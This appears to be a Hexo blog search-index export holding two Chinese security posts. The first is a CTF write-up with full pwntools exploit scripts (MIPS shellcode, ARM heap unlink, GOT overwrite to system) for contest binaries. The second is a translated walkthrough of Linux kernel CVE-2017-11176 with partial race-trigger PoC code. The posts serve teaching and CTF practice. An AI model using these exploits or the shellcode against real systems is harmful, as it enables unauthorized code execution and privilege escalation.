<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[护网杯2019线下赛 部分Pwn WriteUp]]></title>
    <url>%2F2019%2F10%2F22%2Fhwb19-final-pwn%2F</url>
    <content type="text"><![CDATA[护网杯2019线下赛部分Pwn WriteUp：1个MIPS和2个ARM的Pwn。 0x01 mipsio程序.bss段上存在random的file结构体，通过数组下标的问题，使得该处被堆地址所覆盖。利用堆块释放时的chain，使得vtable和表中特定函数指向可控地址。利用MIPS没有NX来执行shellcode。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *context.log_level = 'debug'def add(p, idx, size, ifRandom, content=''): p.sendlineafter('&gt;&gt; ', str(1)) p.sendlineafter('index?\n', str(idx)) p.sendlineafter('size?\n', str(size)) if content == '': p.sendlineafter(']\n', 'y') else: p.sendlineafter(']\n', 'n') p.sendafter('?\n', content) def delete(p, idx): p.sendlineafter('&gt;&gt; ', str(2)) p.sendlineafter('index?\n', str(idx))def pwn(): context.terminal = ['tmux', 'split', '-h'] context.binary = './vuln' if sys.argv[1] == "r": p = remote("172.16.9.45", 10427) elif sys.argv[1] == "l": p = process(["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu/", "./vuln"]) else: p = process(["qemu-mipsel", "-g", "1234", "-L", "/usr/mipsel-linux-gnu/", "./vuln"]) sleep(1) delete(p, -8) add(p, 0x80000000, 0x90, 0, p32(0xfbad8000)) #0xfbad848b add(p, 0, 0x10, 0, 'sunichi') add(p, 1, 0x10, 0, 'sunichi') delete(p, 1) delete(p, 0) payload = '\x28' add(p, 2, 0x10, 0, payload) payload = 'a' * 0x10 add(p, 3, 0x10, 0, payload) add(p, 4, 8, 0, 'sunichi') add(p, 5, 0x20, 0, 'sunichi') add(p, 6, 0x20, 0, 'sunichi') delete(p, 6) delete(p, 5) buf = "" buf += "\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0" buf += "\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff" buf += "\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02" buf += "\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00" add(p, 7, 0x20, 0, '\x98') add(p, 8, 0x20, 0, 'sunichi') delete(p, 8) add(p, 9, 0x100, 0, buf) #flag&#123;0c48137a-3c39-4fa7-a73c-795aa2e8f71f&#125; p.interactive() p.close() if __name__ == "__main__": pwn() 0x02 arm-unlink就是一个常规的unlink，只不过在arm架构下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level = 'debug'def add(p, size): p.sendlineafter('&gt;&gt; ', str(1)) p.sendlineafter('?\n', str(size))def delete(p, idx): p.sendlineafter('&gt;&gt; ', str(2)) p.sendlineafter('?\n', str(idx))def edit(p, idx, content): p.sendlineafter('&gt;&gt; ', str(3)) p.sendlineafter('?\n', str(idx)) p.sendafter('\n', content)def pwn(): context.terminal = ['tmux', 'split', '-h'] context.binary = './vuln' elf = ELF('./vuln') if sys.argv[1] == "r": p = remote("172.16.9.45", 10623) libc = ELF('./libc.so.6') elif sys.argv[1] == "l": p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./vuln"]) libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6') else: p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./vuln"]) libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6') sleep(1) add(p, 0x84) #0 add(p, 0xe4) #1 add(p, 0xe4) #2 add(p, 0x84) #3 add(p, 0x84) #4 edit(p, 2, p32(0) * 4 + p32(0x100) + p32(0xd0)) delete(p, 1) #-1 delete(p, 2) #-2 edit(p, 0, 'a' * 0x84) add(p, 0x40) #1 add(p, 0x64) #2 add(p, 0x40) #5 delete(p, 1) #-1 delete(p, 3) #-3 add(p, 0x50) #1 add(p, 0x40) #3 add(p, 0x50) #6 add(p, 0x50) #7 payload = p32(0) + p32(0x51) + p32(0x2106c + 8 - 12) + p32(0x2106c + 8 - 8) + p32(0) * 16 + p32(0x50) + p32(0x58)[:2] edit(p, 2, payload) delete(p, 6) edit(p, 2, p32(0) + p32(elf.got['free'])) edit(p, 0, p32(elf.plt['puts'])) delete(p, 7) recv = p.recv(4) libc.address = u32(recv) - 88/2 - 0x18 - libc.symbols['__malloc_hook'] + 0x470 edit(p, 0, p32(libc.symbols['system'])) edit(p, 3, '/bin/sh\x00') delete(p, 3) #flag&#123;95633964-1915-4d63-9164-8b6b153ffe3b&#125; print hex(libc.address) p.interactive() p.close()if __name__ == "__main__": pwn() 0x03 bookmanager同样需要利用unlink，只不过步骤比之前那题麻烦很多。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from pwn import *context.log_level = 'debug'def add(p, name, size, content): p.sendlineafter('&gt;&gt; ', str(1)) p.sendafter('book name?\n', name) p.sendlineafter('?\n', str(size)) p.sendafter('?\n', content)def delete(p, idx): p.sendlineafter('&gt;&gt; ', str(2)) p.sendlineafter('?\n', str(idx))def edit(p, idx, name, content): p.sendlineafter('&gt;&gt; ', str(3)) p.sendlineafter('?\n', str(idx)) p.sendafter('\n', name) p.sendafter('\n', content)def show(p, idx): p.sendlineafter('&gt;&gt; ', str(4)) p.sendlineafter('?\n', str(idx))def pwn(): context.terminal = ['tmux', 'split', '-h'] context.binary = './vuln' elf = ELF('./vuln') if sys.argv[1] == "r": p = remote("172.16.9.45", 11410) libc = ELF('./libc.so.6') elif sys.argv[1] == "l": p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./vuln"]) libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6') else: p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./vuln"]) libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6') sleep(1) add(p, 'sunichi', 0x34, '0' * 0x34) #0 add(p, 'sunichi', 0x34, '1' * 0x34) #1 add(p, '/bin/sh\x00', 0x34, '/bin/sh\x00') #2 add(p, '/bin/sh\x00', 0x34, '/bin/sh\x00') #3 add(p, 'sunichi', 0x34, '4' * 0x34) #4 edit(p, 0, 'sunichi', '0' * 0x34 + chr(0x28+0x38+0x28+0x38+1)) delete(p, 1) add(p, 'sunichi', 0x8, '1' * 4) #1 add(p, 'sunichi', 0x8 * 4, '5' * 4) #5 show(p, 2) p.recvuntil('5555') recv = p.recv(4) libc.address = u32(recv) - 88/2 - 0x18 - libc.symbols['__malloc_hook'] + 0x470 p.sendlineafter('&gt;&gt; ', str(666)) p.sendlineafter('exchange the libc address with bss address\n', str(libc.symbols['malloc'])) p.recvuntil('your bss address ') recv = p.recvuntil('\n', drop=True) elf.address = int(recv, 16) - 0x12090 print hex(elf.address) add(p, 'sunichi', 0x8, '6' * 4) #6 print hex(libc.address) add(p, 'sunichi', 0x8, '7' * 0x8) #7 add(p, 'sunichi', 0x44, '8' * 0x44) #8 add(p, 'sunichi', 0x44, '9' * 0x44) #9 add(p, 'sunichi', 0x44, '10' * (0x44/2)) #10 edit(p, 4, 'sunichi', '4' * 0x34 + '\xa9') delete(p, 7) #payload = p32(0) * 3 + p32(0x29) + p32(0) + p32(0x69) + p32(0) * 24 + p32(0x68) payload = 's' * 0x7c add(p, 'sunichi', 0x7c, payload) #7 payload = p32(0) * 3 + p32(0x29) + p32(0) + p32(0x69) + p32(elf.address + 0x12090 + 0x20 - 12) + p32(elf.address + 0x12090 + 0x20 - 8) payload += p32(0) * 22 + p32(0x68) + chr(0x28+0x48+0x28) edit(p, 7, 'sunichi', payload) delete(p, 9) add(p, 'sunichi', 0x7c, 'a') add(p, 'sunichi', 0x7c, 'b') add(p, 'sunichi', 0x7c, 'c') add(p, 'sunichi', 0x7c, 'd') add(p, 'sunichi', 0x7c, 'e') payload = p32(elf.address + 0x12090-4) + p32(0) + p32(elf.got['free']) edit(p, 8, payload, 'sunichi') edit(p, 5, 'sunichi', p32(libc.symbols['system'])) delete(p, 3) print hex(libc.symbols['system']) print hex(elf.got['free']) p.interactive() p.close() if __name__ == "__main__": pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>hwb</tag>
        <tag>arm</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【翻译&复现】CVE-2017-11176分析(2)]]></title>
    <url>%2F2019%2F10%2F08%2FCVE-2017-11176-2%2F</url>
    <content type="text"><![CDATA[根据lexfo博客进行的CVE-2017-11176分析和复现（第二部分）。 源自文章： https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html 0x00 前言在此前的文章中我们详细分析了CVE-2017-11176（mq_notify: double sock_put()）的原理和相关攻击场景。我们在System Tap的帮助下“强制”在内核态触发并验证了这个bug，并编写了第一个版本的exp。有三个触发bug的条件： 强制netlink_attachskb()返回1 Unblock exploit thread 强制第二次fget()返回NULL 在这篇文章中，我们将会尝试不使用System Tap，而是只通过用户态代码来满足上述条件。在本文的结尾，我们将会有能稳定触发bug的poc代码。 0x01 核心概念 #2在核心概念的第二部分将会介绍调度子系统。首先关注的是任务状态和一个任务如何在不同状态间进行转换。注：实际的调度器算法CFS不会在这讨论。主要讨论的是等待队列，因为在Unblock thread和获取任意函数调用的时候会用到。 任务状态任务的运行状态保存在task_struct的state中，一个任务一定是所有状态的其中之一 Running：进程正在CPU上执行或正在等待被运行 Waiting：进程由于等待事件或资源，处于等待或睡眠状态， …… 一个正在运行的任务（TASK_RUNNING）属于run queue，它正在被执行或即将被执行。而一个正在等待的任务没有被任何一个CPU执行，它可以在wait queues或信号的帮助下被唤醒。正在等待的任务最常见的状态是TASK_INTERRUPTIBLE。 状态被定义在： 12345// [include/linux/sched.h]#define TASK_RUNNING 0#define TASK_INTERRUPTIBLE 1// ... cut (other states) ... state可以直接使用或者通过使用current宏的__set_current_state()： 1234// [include/linux/sched.h]#define __set_current_state(state_value) \ do &#123; current-&gt;state = (state_value); &#125; while (0) Run Queues结构体rq是调度器中最重要的数据结构之一，每一个在run queue中的任务都会被CPU执行，每一个CPU拥有自己的run queue（运行真正的多任务）。run queue包含在给定CPU上运行“可选”（由调度器）的任务列表。它还有调度器用于做出“公平”选择的统计信息，并最终重新平衡每个CPU之间的负载（即CPU迁移）。 Run queue包含在给定CPU上运行（由调度程序）“可选”的任务列表。 它还具有调度程序用于做出“公平”选择的统计信息，并最终重新平衡每个CPU之间的负载（即CPU迁移）。 12345678// [kernel/sched.c]struct rq &#123; unsigned long nr_running; // &lt;----- statistics u64 nr_switches; // &lt;----- statistics struct task_struct *curr; // &lt;----- the current running task on the cpu // ...&#125;; 注：在使用CFS的时候，存储实际任务列表的方式有点复杂，但这并不重要。 为了简单起见，考虑从任何run queue中移出的任务不会被执行（即没有CPU来执行它）。这正是deactivate_task()函数的功能，而activate_task()功能相反。 阻塞一个任务与schedule()当一个任务想要从running转换成waiting状态时，它需要至少做两件事： 设置它的运行状态为TASK_INTERRUPTIBLE 唤起deactivate_task()将它从run queue中移出 实际上，没有人直接调用deactivate_task()，而是调用schedule()。schedule()是调度器的主要函数，当调用它时，必须选择下一个（running）任务在CPU上运行，也就是说必须更新run queue的curr字段。 但是，如果在当前任务状态不是running时调用schedule()（即其状态与零不同），并且没有信号挂起，则它将调用deactivate_task()： 123456789101112131415161718192021asmlinkage void __sched schedule(void)&#123; struct task_struct *prev, *next; unsigned long *switch_count; struct rq *rq; int cpu; // ... cut ... prev = rq-&gt;curr; // &lt;---- "prev" is the task running on the current CPU if (prev-&gt;state &amp;&amp; !(preempt_count() &amp; PREEMPT_ACTIVE)) &#123; // &lt;----- ignore the "preempt" stuff if (unlikely(signal_pending_state(prev-&gt;state, prev))) prev-&gt;state = TASK_RUNNING; else deactivate_task(rq, prev, DEQUEUE_SLEEP); // &lt;----- task is moved out of run queue switch_count = &amp;prev-&gt;nvcsw; &#125; // ... cut (choose the next task) ...&#125; 最后，任务可以通过执行以下代码来阻塞： 12345void make_it_block(void)&#123; __set_current_state(TASK_INTERRUPTIBLE); schedule();&#125; 任务将会持续阻塞直到有人唤醒它。 Wait Queues等待资源或特殊事件非常普遍。 例如，如果运行服务器，主线程可能正在等待传入连接。除非它被标记为“非阻塞”，否则accept()系统调用将阻塞主线程。也就是说，主线程被卡在内核中，直到有东西唤醒它。 wait queue是当前被阻塞进程的双向链表，有的人可能会把它看run queue的“对立面”。其本身用wait_queue_head_t表示： 12345678// [include/linux/wait.h]typedef struct __wait_queue_head wait_queue_head_t;struct __wait_queue_head &#123; spinlock_t lock; struct list_head task_list;&#125;; 注：struct list_head是Linux实现双向链表的类型。 链表中的元素类型是wait_queue_t： 1234567891011// [include/linux.wait.h]typedef struct __wait_queue wait_queue_t;typedef int (*wait_queue_func_t)(wait_queue_t *wait, unsigned mode, int flags, void *key);struct __wait_queue &#123; unsigned int flags; void *private; wait_queue_func_t func; // &lt;----- we will get back to this struct list_head task_list;&#125;; 一个wait queue的元素可以使用宏定义DECLARE_WAITQUEUE()创建： 123456789// [include/linux/wait.h]#define __WAITQUEUE_INITIALIZER(name, tsk) &#123; \ .private = tsk, \ .func = default_wake_function, \ .task_list = &#123; NULL, NULL &#125; &#125;#define DECLARE_WAITQUEUE(name, tsk) \ wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk) // &lt;----- it creates a variable! 调用方式： 1DECLARE_WAITQUEUE(my_wait_queue_elt, current); // &lt;----- use the "current" macro 最后，一旦声明了一个wait queue的元素，就可以使用add_wait_queue()将其排入wait queue中。它仅将元素添加到双向链表中并使用了锁。 12345678910111213141516// [kernel/wait.c]void add_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)&#123; unsigned long flags; wait-&gt;flags &amp;= ~WQ_FLAG_EXCLUSIVE; spin_lock_irqsave(&amp;q-&gt;lock, flags); __add_wait_queue(q, wait); // &lt;----- here spin_unlock_irqrestore(&amp;q-&gt;lock, flags);&#125;static inline void __add_wait_queue(wait_queue_head_t *head, wait_queue_t *new)&#123; list_add(&amp;new-&gt;task_list, &amp;head-&gt;task_list);&#125; 调用add_wait_queue()又被称为”registering to a wait queue”。 Waking up a task到目前为止，我们知道两种队列：run queues和wait queues。要阻塞一个任务就是使用deactivate_task()将其从run queue中删除，但它如何从阻塞（休眠）状态转换回运行状态？ 注：阻塞的任务可以通过信号或其他方式唤醒，但这超出了本次的讨论范围。 由于被阻塞的任务不再运行，因此无法自行唤醒，唤醒工作需要由另一个任务完成。 具有特定资源所有权的数据结构具有wait queue，当任务想要访问此资源但不可用时，改任务可以使自己处于休眠状态，直到资源所有者唤醒为止。为了在资源可用时被唤醒，它必须注册到资源的等待队列。正如我们之前看到的，这个“注册”是通过add_wait_queue()完成的。当资源可用时，资源所有者唤醒一个或多个任务，以便它们能够继续执行。这是通过__wake_up()完成的。 当资源可用时，所有者唤醒一个或多个任务，以便他们可以继续执行。这是通过__wake_up（）函数完成的： 12345678910111213141516171819202122// [kernel/sched.c]/** * __wake_up - wake up threads blocked on a waitqueue. * @q: the waitqueue * @mode: which threads * @nr_exclusive: how many wake-one or wake-many threads to wake up * @key: is directly passed to the wakeup function * * It may be assumed that this function implies a write memory barrier before * changing the task state if and only if any tasks are woken up. */void __wake_up(wait_queue_head_t *q, unsigned int mode, int nr_exclusive, void *key)&#123; unsigned long flags; spin_lock_irqsave(&amp;q-&gt;lock, flags); __wake_up_common(q, mode, nr_exclusive, 0, key); // &lt;----- here spin_unlock_irqrestore(&amp;q-&gt;lock, flags);&#125; 123456789101112131415 // [kernel/sched.c] static void __wake_up_common(wait_queue_head_t *q, unsigned int mode, int nr_exclusive, int wake_flags, void *key) &#123; wait_queue_t *curr, *next;[0] list_for_each_entry_safe(curr, next, &amp;q-&gt;task_list, task_list) &#123; unsigned flags = curr-&gt;flags;[1] if (curr-&gt;func(curr, mode, wake_flags, key) &amp;&amp; (flags &amp; WQ_FLAG_EXCLUSIVE) &amp;&amp; !--nr_exclusive) break; &#125; &#125; 此函数迭代wait queue[0]中的每个元素（list_for_each_entry_safe()是与双向链表一起使用的公共宏）。对于每个元素，它调用func()回调函数[1]。还记得DECLARE_WAITQUEUE()宏吗？它将func回调设置成default_wake_function()： 123456789// [include/linux/wait.h]#define __WAITQUEUE_INITIALIZER(name, tsk) &#123; \ .private = tsk, \ .func = default_wake_function, \ // &lt;------ .task_list = &#123; NULL, NULL &#125; &#125;#define DECLARE_WAITQUEUE(name, tsk) \ wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk) 反过来，default_wake_function()只使用wait queue元素的私有字段调用try_to_wake_up()（在大多数情况下指向睡眠的任务的task_struct）： 12345int default_wake_function(wait_queue_t *curr, unsigned mode, int wake_flags, void *key)&#123; return try_to_wake_up(curr-&gt;private, mode, wake_flags);&#125; 最后，try_to_wake_up()是schedule()的对立面，当schedult()调出当前任务时，try_to_wake_up()可使其再次可调度。也就是说，它将其置于run queue中并改变其运行状态。 123456789101112131415161718192021222324static int try_to_wake_up(struct task_struct *p, unsigned int state, int wake_flags)&#123; struct rq *rq; // ... cut (find the appropriate run queue) ...out_activate: schedstat_inc(p, se.nr_wakeups); // &lt;----- update some stats if (wake_flags &amp; WF_SYNC) schedstat_inc(p, se.nr_wakeups_sync); if (orig_cpu != cpu) schedstat_inc(p, se.nr_wakeups_migrate); if (cpu == this_cpu) schedstat_inc(p, se.nr_wakeups_local); else schedstat_inc(p, se.nr_wakeups_remote); activate_task(rq, p, en_flags); // &lt;----- put it back to run queue! success = 1; p-&gt;state = TASK_RUNNING; // &lt;----- the state has changed! // ... cut ...&#125; 这是调用activate_task()的地方（还有其他地方），因为任务现在回到run queue中并且其状态为TASK_RUNNING，所以它可能被调度。因此，在调用schedule()时的位置继续执行。 实际上，很少直接调用__wake_up()而是调用辅助宏： 123456789// [include/linux/wait.h]#define wake_up(x) __wake_up(x, TASK_NORMAL, 1, NULL)#define wake_up_nr(x, nr) __wake_up(x, TASK_NORMAL, nr, NULL)#define wake_up_all(x) __wake_up(x, TASK_NORMAL, 0, NULL)#define wake_up_interruptible(x) __wake_up(x, TASK_INTERRUPTIBLE, 1, NULL)#define wake_up_interruptible_nr(x, nr) __wake_up(x, TASK_INTERRUPTIBLE, nr, NULL)#define wake_up_interruptible_all(x) __wake_up(x, TASK_INTERRUPTIBLE, 0, NULL) 一个完整的示例这是一个简单的例子来总结上述概念： 12345678910111213141516171819202122232425262728struct resource_a &#123; bool resource_is_ready; wait_queue_head_t wq;&#125;;void task_0_wants_resource_a(struct resource_a *res)&#123; if (!res-&gt;resource_is_ready) &#123; // "register" to be woken up DECLARE_WAITQUEUE(task0_wait_element, current); add_wait_queue(&amp;res-&gt;wq, &amp;task0_wait_element); // start sleeping __set_current_state(TASK_INTERRUPTIBLE); schedule(); // We'll restart HERE once woken up // Remember to "unregister" from wait queue &#125; // XXX: ... do something with the resource ...&#125;void task_1_makes_resource_available(struct resource_a *res)&#123; res-&gt;resource_is_ready = true; wake_up_interruptible_all(&amp;res-&gt;wq); // &lt;--- unblock "task 0"&#125; 一个线程运行task_0_tants_resource_a()后，会因为资源不可用而被阻塞，在某些时候，资源所有者（来自另一个线程）使其可用并调用task_1_makes_resource_available()。在此之后，task_0_tants_resource_a()可恢复执行。 我们经常在Linux内核代码中看到pattern，你现在知道它的含义。注意术语“资源”在这以通用方式使用。任务可以等待事件、条件为真或其他情况。每当你看到一个阻塞系统调用时，等待队列的可能性就不大了（Every time you see a “blocking” syscall, chances are a wait queue is not that far）。 0x02 Unblocking the Main Thread在此前的文章中，我们尝试并解决了强制netlink_attachskb()返回1时的几个问题。第一个问题是调用mq_notify()时被阻塞。为了解决这个问题，我们简单地绕过了对schedule_timeout()的调用，但随后又进入了无限循环。我们通过从文件描述符表（FDT）中删除目标文件描述符来停止循环，这偶然满足了一个条件：它使第二个fget()调用返回NULL。这是通过System Tap脚本完成的： 123456789101112 function force_trigger:long (arg_sock:long) %&#123; struct sock *sk = (void*) STAP_ARG_arg_sock;[0] sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD); // avoid blocking the thread struct netlink_sock *nlk = (void*) sk; nlk-&gt;state |= 1; // enter the netlink_attachskb() retry path struct files_struct *files = current-&gt;files; struct fdtable *fdt = files_fdtable(files); fdt-&gt;fd[3] = NULL; // makes the second call to fget() fails %&#125; 在这一章中，我们将会尝试移除脚本中[0]处的代码，这意味着mq_notify()的调用会重新阻塞。在这我们有两种解决办法： 如同stap脚本一样把sock标记为SOCK_DEAD Unblock thread 控制并赢得条件竞争我们的主线程被阻止实际上是一件好事，还记得补丁描述了一个关于“窗口”的东西？我们的攻击场景是什么？ 所以，“小窗口”是我们有机会调用close()的地方。调用close()将使fget()的调用返回NULL。窗口本身在调用fget()成功后开启，并在第二次调用fget()之前关闭。在攻击场景中，我们在netlink_attachskb()之后调用close()，但是在stap脚本中，我们实际上是在调用netlink_attachskb()之前模拟了它。 如果我们绕过调用schedule_timeout()，那么竞争窗口确实是“小”的。这不是System Tap的问题，因为我们在调用netlink_attachskb()之前修改了内核数据，我们在用户态不会拥有这种权限。 另一方面，如果我们可以在netlink_attachskb()中间阻塞并有办法恢复它，那么竞争窗口实际上就比我们想的要大。换句话说，我们就有办法控制竞争条件，我们可以将其视作在主线程中设置了“断点”。 (图待上传) 阻塞主线程似乎是赢得条件竞争的一个好方法，但这意味着我们需要有办法恢复被阻塞的主线程。 Identify “unblocker” candidates在本节中，我们将看到netlink_attachskb()如何被阻塞及解除阻塞。再来看下netlink_attachskb()的代码： 12345678910111213141516171819202122232425262728293031323334353637 // [net/netlink/af_netlink.c] int netlink_attachskb(struct sock *sk, struct sk_buff *skb, long *timeo, struct sock *ssk) &#123; struct netlink_sock *nlk; nlk = nlk_sk(sk); if (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &#123;[0] DECLARE_WAITQUEUE(wait, current); if (!*timeo) &#123; // ... cut (unreachable code from mq_notify) ... &#125;[1] __set_current_state(TASK_INTERRUPTIBLE);[2] add_wait_queue(&amp;nlk-&gt;wait, &amp;wait);[3] if ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &amp;&amp; !sock_flag(sk, SOCK_DEAD))[4] *timeo = schedule_timeout(*timeo);[5] __set_current_state(TASK_RUNNING);[6] remove_wait_queue(&amp;nlk-&gt;wait, &amp;wait); sock_put(sk); if (signal_pending(current)) &#123; kfree_skb(skb); return sock_intr_errno(*timeo); &#125; return 1; &#125; skb_set_owner_r(skb, sk); return 0; &#125; __set_current_state(TASK_INTERRUPTIBLE)[1]和schedule_timeout()[4]的结合使得线程被阻塞，条件[3]为真是因为： 我们使用System Tap强制nlk-&gt;state |= 1 sock不是DEAD，我们移除了脚本中的sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD) 注：调用schedule_timeout(MAX_SCHEDULE_TIMEOUT)与调用schedule()等价。 众所周知，如果被阻塞的线程已注册到wake queue中，则可以将其唤醒，该注册使用[0]和[2]，而注销在[6]中完成。等待队列本身是nlk-&gt; wait。也就是说，它属于netlink_sock对象： 1234567struct netlink_sock &#123; /* struct sock has to be the first member of netlink_sock */ struct sock sk; // ... cut ... wait_queue_head_t wait; // &lt;----- the wait queue // ... cut ...&#125;; 这意味着，netlink_sock对象负责唤醒被阻塞的线程。 nlk-&gt;wait wait queue在四个地方被使用： __netlink_create() netlink_release() netlink_rcv_wake() netlink_setsockopt() 函数__netlink_create()在netlink socket创建的时候被调用，它通过init_waitqueue_head()函数初始化一个空的wait queue。 当关联的struct file即将被释放时，将调用函数netlink_release()（refcounter变为零）。它调用wake_up_interruptible_all()。 函数netlink_rcv_wake()由netlink_recvmsg()调用并调用wake_up_interruptible()。它这么做实际上是有道理的，因为阻塞的第一个原因是因为接收缓冲区已满。如果调用netlink_recvmsg()，则接收缓冲区中可能会有更多的空闲空间。 最后，netlink_setsockopt()由系统调用setsockopt()调用。如果optname是NETLINK_NO_ENOBUFS，会调用wake_up_interruptible()。 所以我们有三种候选方案来唤醒我们的线程（__netlink_create()除外，它没有唤醒任何东西）。面对这些选择时，我们需要一条路径： 快速到达我们所需要的目标（在我们的例子中为wake_up_interruptible()），也就是说，少量的函数调用和条件约束等 对内核几乎没有影响和副作用（没有内存分配，不要触及其他数据结构等） 因为我们不想释放与sock相关的struct file并且这是我们可以触发use-after-free的可控方法，我们不使用netlink_release()。 netlink_rcv_wake()路径是最“复杂”的路径，在从recvmsg()系统调用到达它之前，我们需要在generic sock API中通过几个检查，它还分配各种东西等。调用追踪： 12345678- SYSCALL_DEFINE3(recvmsg)- __sys_recvmsg- sock_recvmsg- __sock_recvmsg- __sock_recvmsg_nosec // calls sock-&gt;ops-&gt;recvmsg()- netlink_recvmsg- netlink_rcv_wake- wake_up_interruptible 与之相对比的是setsockopt()： 123- SYSCALL_DEFINE5(setsockopt) // calls sock-&gt;ops-&gt;setsockopt()- netlink_setsockopt()- wake_up_interruptible Reaching wake_up_interruptible() from setsockopt syscall在之前的小节中，调用wake_up_interruptible()最简单的方法是通过setsockopt系统调用。现在分析下有哪些检查是需要我们绕过的： 123456789101112131415161718192021222324252627282930 // [net/socket.c] SYSCALL_DEFINE5(setsockopt, int, fd, int, level, int, optname, char __user *, optval, int, optlen) &#123; int err, fput_needed; struct socket *sock;[0] if (optlen &lt; 0) return -EINVAL; sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);[1] if (sock != NULL) &#123; err = security_socket_setsockopt(sock, level, optname);[2] if (err) goto out_put;[3] if (level == SOL_SOCKET) err = sock_setsockopt(sock, level, optname, optval, optlen); else err =[4] sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval, optlen); out_put: fput_light(sock-&gt;file, fput_needed); &#125; return err; &#125; 我们需要： [0] - optlen非负 [1] - fd是一个有效的的socket [2] - LSM必须允许我们对socket调用setsockopt() [3] - level与SOL_SOCKET不同 如果我们绕过了这些检查，netlink_setsockopt()[4]将会被调用： 123456789101112131415161718192021222324252627282930313233 // [net/netlink/af_netlink.c] static int netlink_setsockopt(struct socket *sock, int level, int optname, char __user *optval, unsigned int optlen) &#123; struct sock *sk = sock-&gt;sk; struct netlink_sock *nlk = nlk_sk(sk); unsigned int val = 0; int err;[5] if (level != SOL_NETLINK) return -ENOPROTOOPT;[6] if (optlen &gt;= sizeof(int) &amp;&amp; get_user(val, (unsigned int __user *)optval)) return -EFAULT; switch (optname) &#123; // ... cut (other options) ...[7] case NETLINK_NO_ENOBUFS:[8] if (val) &#123; nlk-&gt;flags |= NETLINK_RECV_NO_ENOBUFS; clear_bit(0, &amp;nlk-&gt;state);[9] wake_up_interruptible(&amp;nlk-&gt;wait); &#125; else nlk-&gt;flags &amp;= ~NETLINK_RECV_NO_ENOBUFS; err = 0; break; default: err = -ENOPROTOOPT; &#125; return err; &#125; 在setsockopt()中的检查还有： [5] - level等于SOL_NETLINK [6] - optlen必须大于等于sizeof(int)并且optval是可读地址 [7] - optname等于NETLINK_NO_ENOBUFS [8] - val不等于0 如果我们通过了所有的检查，walk_up_interruptible()将会被调用，被阻塞的进程会被唤醒，下列代码片段就是用来触发它的： 123int sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC); // same socket used by blocking threadint val = 3535; // different than zero_setsockopt(sock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, sizeof(val)); Updating The Exploit在之前的小节中，我们知道了如何通过setsockopt()系统调用从用户态来触发wake_up_interruptible()，但仍有个问题：如何在我们自己被阻塞的时候去调用其他函数？答案就是利用多线程。所以我们将创建另一个线程（调用unblock_thread）并更新我们的exploit（使用”-pthread”编译）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556struct unblock_thread_arg&#123; int fd; bool is_ready; // we could use pthread's barrier here instead&#125;;static void* unblock_thread(void *arg)&#123; struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg; int val = 3535; // need to be different than zero // notify the main thread that the unblock thread has been created uta-&gt;is_ready = true; // WARNING: the main thread *must* directly call mq_notify() once notified! sleep(5); // gives some time for the main thread to block printf("[unblock] unblocking now\n"); if (_setsockopt(uta-&gt;fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, sizeof(val))) perror("setsockopt"); return NULL;&#125;int main(void)&#123; struct sigevent sigev; char sival_buffer[NOTIFY_COOKIE_LEN]; int sock_fd; pthread_t tid; struct unblock_thread_arg uta; // ... cut ... // initialize the unblock thread arguments, and launch it memset(&amp;uta, 0, sizeof(uta)); uta.fd = sock_fd; uta.is_ready = false; printf("creating unblock thread...\n"); if ((errno = pthread_create(&amp;tid, NULL, unblock_thread, &amp;uta)) != 0) &#123; perror("pthread_create"); goto fail; &#125; while (uta.is_ready == false) // spinlock until thread is created ; printf("unblocking thread has been created!\n"); printf("get ready to block\n"); if (_mq_notify((mqd_t)-1, &amp;sigev)) &#123; perror("mq_notify"); goto fail; &#125; printf("mq_notify succeed\n"); // ... cut ...&#125; 可能有人会注意到代码中调用了sleep(5)和修改了uta-&gt;is_ready，下面来解释一下。 